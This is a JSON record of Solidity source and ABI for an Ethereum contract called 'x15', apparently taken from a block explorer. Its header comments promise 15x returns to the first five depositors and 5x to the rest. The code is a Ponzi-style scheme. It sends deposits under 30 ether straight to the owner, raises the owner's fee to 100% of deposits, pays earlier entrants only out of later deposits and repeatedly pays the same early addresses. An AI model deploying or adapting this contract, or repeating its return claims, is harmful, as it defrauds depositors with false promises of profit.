{"SourceCode":"//------------------------------------------------X15------------------------------------------------------------------------\r\n//\r\n// First 5 Depositors will Multiply their Ether by 15x!!!! The rest of the players will Earn 5x of their Deposits!!!\r\n//\r\n// Minimum Deposit: 30 Ether!\r\n//\r\n// It's crazy, with just 30 Ether Deposit you will Earn 450 Ether!\r\n//\r\n// Start Earning NOW!!!\r\n//\r\n//---------------------------------------------------------------------------------------------------------------------------\r\ncontract x15{\r\nstruct earnerarray{\r\naddress etherAddress;\r\nuint amount;\r\n}\r\nearnerarray[] public crazyearners;\r\nuint public deposits_until_jackpot=0;\r\nuint public totalearners=0; uint public feerate=1;uint public profitrate=200;uint public jackpotrate=700; uint alpha=1; uint feeamount=0; uint public balance=0; uint public totaldeposited=0; uint public totalmoneyearned=0;\r\naddress public kappa; modifier onlyowner{if(msg.sender==kappa)_}\r\nfunction x15(){\r\nkappa=msg.sender;\r\n}\r\nfunction(){\r\nenter();\r\n}\r\nfunction enter(){\r\nif(msg.value<30 ether){\r\nkappa.send(msg.value);\r\nreturn;\r\n}\r\nuint calculator; uint beta;\r\nuint amount=msg.value;uint tot_pl=crazyearners.length;totalearners=tot_pl+1;\r\ndeposits_until_jackpot=20-(totalearners%20);\r\ncrazyearners.length+=1;crazyearners[tot_pl].etherAddress=msg.sender;\r\ncrazyearners[tot_pl].amount=amount;\r\nfeeamount=amount*alpha/100;balance+=amount;totaldeposited+=amount;\r\nif(feeamount!=0){if(balance>feeamount){kappa.send(feeamount);balance-=feeamount;\r\ntotalmoneyearned+=feeamount;if(alpha<100)alpha+=30;\r\nelse {beta = alpha + crazyearners[tot_pl].amount; calculator= alpha+beta/2; alpha=100; }}} uint payout;uint nr=0;\r\n\r\n\r\n\r\nwhile(balance>crazyearners[nr].amount*500/100 && nr<tot_pl)\r\n{\r\nif( (nr==0 || nr==1 || nr==2 || nr==3 || nr==4 )  &&  balance>crazyearners[nr].amount*1500/100)\r\n{\r\npayout=crazyearners[nr].amount*1500/100;\r\ncrazyearners[nr].etherAddress.send(payout);\r\nbalance-=crazyearners[nr].amount*1500/100;\r\ntotalmoneyearned+=crazyearners[nr].amount*1500/100;\r\n}\r\nelse\r\n{\r\npayout=crazyearners[nr].amount*500/100;\r\ncrazyearners[nr].etherAddress.send(payout);\r\nbalance-=crazyearners[nr].amount*500/100;\r\ntotalmoneyearned+=crazyearners[nr].amount*500/100;\r\n}\r\nnr+=1;\r\n}}}","ABI":"[{\"constant\":true,\"inputs\":[],\"name\":\"feerate\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"jackpotrate\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"deposits_until_jackpot\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalmoneyearned\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalearners\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"kappa\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"profitrate\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"crazyearners\",\"outputs\":[{\"name\":\"etherAddress\",\"type\":\"address\"},{\"name\":\"amount\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"balance\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totaldeposited\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"enter\",\"outputs\":[],\"type\":\"function\"},{\"inputs\":[],\"type\":\"constructor\"}]","ContractName":"x15","CompilerVersion":"v0.2.2-2016-03-10-34d714f","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","LicenseType":"","SwarmSource":""}
